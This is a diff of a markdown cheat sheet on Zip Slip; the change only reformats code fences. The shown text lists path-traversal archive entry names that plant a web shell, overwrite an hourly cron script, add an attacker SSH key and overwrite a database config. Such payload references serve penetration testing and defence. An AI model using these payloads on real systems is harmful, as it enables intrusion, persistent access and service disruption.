@@ -1,6 +1,7 @@
 # Zip Slip
 
 ## Table of Contents
+
 - [RCE](#rce)
 - [Persistent Access](#persistent-access)
 - [Denial of Service](#denial-of-service)
@@ -11,7 +12,7 @@
 
 - Writing a web shell into the served directory
     1. Entry name inside the archive
-        ```
+        ```text
         ../../../../var/www/html/shell.php
         ```
 
@@ -26,7 +27,7 @@
 
 - Overwriting a script the service already runs
     1. Entry name inside the archive
-        ```
+        ```text
         ../../../../etc/cron.hourly/logrotate
         ```
 
@@ -44,12 +45,12 @@
 
 - Adding an authorized SSH key
     1. Entry name inside the archive
-        ```
+        ```text
         ../../../../home/user/.ssh/authorized_keys
         ```
 
     2. Extracted file
-        ```
+        ```text
         ssh-ed25519 AAAA[ATTACKER-PUBLIC-KEY] attacker@[ATTACKER-DOMAIN]
         ```
 
@@ -61,7 +62,7 @@
 
 - Overwriting a file required at startup
     1. Entry name inside the archive
-        ```
+        ```text
         ../../../../app/config/database.yml
         ```
 
